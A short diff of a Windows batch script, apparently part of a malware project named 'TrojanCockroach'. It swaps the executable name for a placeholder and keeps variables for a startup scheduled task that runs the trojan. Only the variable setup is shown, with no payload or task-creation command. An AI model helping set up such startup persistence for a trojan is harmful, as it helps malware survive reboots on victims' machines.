@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set EXE_PATH=%~dp0TrojanCockroach.exe
+set EXE_PATH=%~dp0YourCompiledFilename.exe
 set TASK_NAME=TrojanCockroachTask
 set TASK_DESC=Runs TrojanCockroach on startup
 
